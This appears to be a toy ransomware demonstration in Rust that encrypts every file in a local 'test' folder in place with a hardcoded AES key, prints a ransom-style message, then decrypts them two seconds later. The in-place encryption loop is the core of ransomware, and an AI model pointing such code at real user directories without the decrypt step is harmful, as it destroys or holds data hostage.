extern crate bincode_aes;

use std::fs::{read_dir, OpenOptions};
use std::io::{Read, Write, Seek, SeekFrom};
use std::{str, thread, time};
use std::error::Error;


fn main() {
    let demonstration_time = time::Duration::from_secs(2);
    encrypt_all();
    println!("Oops... all your important files are encrypted.");
    thread::sleep(demonstration_time);
    decrypt_all();
}

fn encrypt_all() {
    let x = "abcdefghijklmnopqrstuvwxyz012345";
    let key = bincode_aes::create_key(x.as_bytes().to_vec()).unwrap();
    let crypt = bincode_aes::with_key(key);

    let directory_entries = read_dir("test").expect("Can't read");

    for entry in directory_entries {
        let path = entry.unwrap().path();
        let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
        let mut contents = vec![];
        file.read_to_end(&mut contents).unwrap();
        println!("-> Encoding {:?}", str::from_utf8_mut(contents.as_mut_slice()).unwrap());

        let encoded = crypt.serialize(&contents).unwrap();
        println!("<- Encoded as: {}", String::from_utf8_lossy(encoded.as_slice()));

        file.seek(SeekFrom::Start(0)).unwrap();
        file.write_all(&mut encoded.as_slice()).unwrap();
    }
}

fn decrypt_all() {
    let x = "abcdefghijklmnopqrstuvwxyz012345";
    let key = bincode_aes::create_key(x.as_bytes().to_vec()).unwrap();
    let crypt = bincode_aes::with_key(key);

    let directory_entries = read_dir("test").expect("Can't read");

    for entry in directory_entries {
        let path = entry.unwrap().path();
        let mut file = OpenOptions::new().read(true).write(true).open(path.as_os_str()).unwrap();
        let mut buffer = vec![];
        file.read_to_end(&mut buffer).unwrap();
        println!("-> Encoded: {}", String::from_utf8_lossy(buffer.as_slice()));


        let decrypted: Result<String, Box<dyn Error>> = crypt.deserialize(&mut buffer);
        match decrypted {
            Ok(original_content) => {
                println!("<- Decoded as: {:?}", original_content);
                file.set_len(0).unwrap();
                file.seek(SeekFrom::Start(0)).unwrap();
                file.write_all(&mut original_content.as_bytes()).unwrap();
            }
            Err(e) => eprintln!("OH FUCK FUCK FUCK FUCK: {:?}", e),
        }
    }
}
